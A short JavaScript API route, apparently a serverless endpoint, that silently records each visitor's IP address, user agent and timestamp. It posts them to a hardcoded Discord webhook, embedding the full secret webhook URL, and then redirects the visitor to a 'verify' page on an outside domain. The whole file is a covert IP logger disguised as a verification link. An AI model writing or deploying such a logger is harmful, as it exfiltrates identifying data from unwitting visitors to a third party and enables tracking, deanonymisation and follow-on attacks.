// /api/track.js

export default async function handler(req, res) {
  try {
    // Grab visitor info
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
    const userAgent = req.headers["user-agent"];
    const time = new Date().toISOString();

    // Discord webhook message (hardcoded)
    const webhookUrl = "https://discord.com/api/webhooks/1412081122048741426/NWsChKO7PqLPxXKhjG0j6gyqzFQOv1Wvby8soi0UGKHkQjkF_6bMGvB3sn6iVsudusVg";

    // Send POST request
    await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `🟢 Visitor logged:\n- IP: ${ip}\n- User-Agent: ${userAgent}\n- Time: ${time}`
      })
    });

    // Redirect visitor
    res.writeHead(302, { Location: "https://vaultcord.win/silkwareverify" });
    res.end();

  } catch (error) {
    console.error("Error sending webhook:", error);
    res.status(500).send("Something went wrong");
  }
}
